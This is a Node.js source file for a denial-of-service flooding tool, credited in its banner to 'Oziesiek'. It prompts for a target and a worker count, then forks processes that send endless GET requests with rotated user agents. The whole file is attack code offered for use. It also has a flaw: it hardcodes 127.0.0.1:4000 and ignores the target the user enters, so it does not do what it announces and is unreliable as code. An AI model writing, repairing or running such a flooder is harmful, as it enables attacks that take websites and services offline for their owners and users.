const cluster = require('cluster');
const http = require('http');
const readline = require('readline');
const colors = require('colors');

// Display the banner at the beginning
if (cluster.isMaster) {
  console.log(colors.red(`
  ▓█████▄ ▓█████  ███▄    █  ██▓ ▄▄▄       ██▓        ▒█████    █████▒     ██████ ▓█████  ██▀███   ██▒   █▓ ██▓ ▄████▄  ▓█████ 
  ▒██▀ ██▌▓█   ▀  ██ ▀█   █ ▓██▒▒████▄    ▓██▒       ▒██▒  ██▒▓██   ▒    ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒▓██░   █▒▓██▒▒██▀ ▀█  ▓█   ▀ 
  ░██   █▌▒███   ▓██  ▀█ ██▒▒██▒▒██  ▀█▄  ▒██░       ▒██░  ██▒▒████ ░    ░ ▓██▄   ▒███   ▓██ ░▄█ ▒ ▓██  █▒░▒██▒▒▓█    ▄ ▒███   
  ░▓█▄   ▌▒▓█  ▄ ▓██▒  ▐▌██▒░██░░██▄▄▄▄██ ▒██░       ▒██   ██░░▓█▒  ░      ▒   ██▒▒▓█  ▄ ▒██▀▀█▄    ▒██ █░░░██░▒▓▓▄ ▄██▒▒▓█  ▄ 
  ░▒████▓ ░▒████▒▒██░   ▓██░░██░ ▓█   ▓██▒░██████▒   ░ ████▓▒░░▒█░       ▒██████▒▒░▒████▒░██▓ ▒██▒   ▒▀█░  ░██░▒ ▓███▀ ░░▒████▒
   ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░▓   ▒▒   ▓▒█░░ ▒░▓  ░   ░ ▒░▒░▒░  ▒ ░       ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▐░  ░▓  ░ ░▒ ▒  ░░░ ▒░ ░
                                                                                                                  by Oziesiek
`));
}

// Define an array of user agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  // Add more user agents as needed
];

// Master process logic
if (cluster.isMaster) {
  // Create readline interface for user input
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  // Prompt user for target address and number of workers
  rl.question('Enter the target address to attack: ', (targetAddress) => {
    if (!targetAddress) {
      console.error('Error: Please provide the target address.');
      rl.close();
      process.exit(1);
    }

    rl.question('Enter the number of workers to use: ', (numWorkers) => {
      console.log('DDoS attack started.');
      // Fork worker processes
      for (let i = 0; i < numWorkers; i++) {
        const worker = cluster.fork({
          silent: true,
          targetAddress,
        });
      }

      // Close the readline interface
      rl.close();
    });
  });
} else {
  // Worker process logic
  function sendRequest(url) {
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    const options = {
      hostname: '127.0.0.1',
      port: 4000,
      path: '/',
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        // Add more headers as needed
      },
    };

    const req = http.request(options, (res) => {
      res.on('data', (chunk) => {
        // Do nothing with the response
      });
      res.on('end', () => {
        // Schedule the next request after a random delay
        setTimeout(() => {
          sendRequest(url);
        }, Math.random() * 10);
      });
    });

    req.on('error', (e) => {
      // Do nothing with the error
    });

    req.end();
  }

  // Start sending requests with the target address from environment variables
  sendRequest(process.env.targetAddress);
}
